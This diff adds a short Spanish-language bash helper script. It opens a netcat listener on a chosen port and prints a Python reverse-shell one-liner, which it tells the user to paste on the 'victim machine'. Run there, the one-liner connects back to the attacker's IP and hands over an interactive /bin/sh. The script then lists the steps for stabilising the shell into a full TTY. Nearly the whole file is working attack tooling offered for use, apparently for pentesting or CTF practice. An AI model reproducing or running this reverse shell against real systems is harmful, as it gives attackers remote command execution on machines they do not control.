@@ -1,0 +1,40 @@
+#!/bin/bash
+#
+#
+
+if [[ -z $1 ]] ; then
+	echo " "
+	echo "[*]pythonshell (+) <puerto de escucha>."
+	echo " "
+	exit
+fi
+
+ipx=`hostname -I`
+
+xterm -e zsh -c "nc -nlvp $1" &
+
+echo " "
+echo "[*]Pegue esto en la máquina víctima: "
+echo " "
+echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ipx",$1));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
+echo " "
+echo "[*]Si quiere shell interactiva: "
+echo " "
+sleep 1
+echo "[1]script /dev/null -c bash"
+echo " "
+sleep 1
+echo "[2]ctrl + z"
+echo " "
+sleep 1
+echo "[3]stty raw -echo; fg"
+echo " "
+sleep 1
+echo "[4]xterm"
+echo " "
+sleep 1
+echo "[5]export TERM=xterm"
+echo " "
+sleep 1
+echo "[6]export SHELL=bash"
+echo " "
